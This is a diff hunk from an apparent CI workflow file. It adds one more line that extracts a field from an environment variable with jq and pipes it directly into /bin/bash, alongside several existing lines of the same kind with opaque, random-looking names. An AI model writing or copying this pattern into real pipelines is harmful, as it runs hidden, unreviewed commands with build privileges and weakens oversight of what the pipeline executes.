@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$mr37" | jq -r .ws28 | /bin/bash
           printf '%s' "$fr85" | jq -r .b68606 | /bin/bash
           printf '%s' "$zntdy3" | jq -r .siox01 | /bin/bash
+          printf '%s' "$yk582" | jq -r .eo94 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
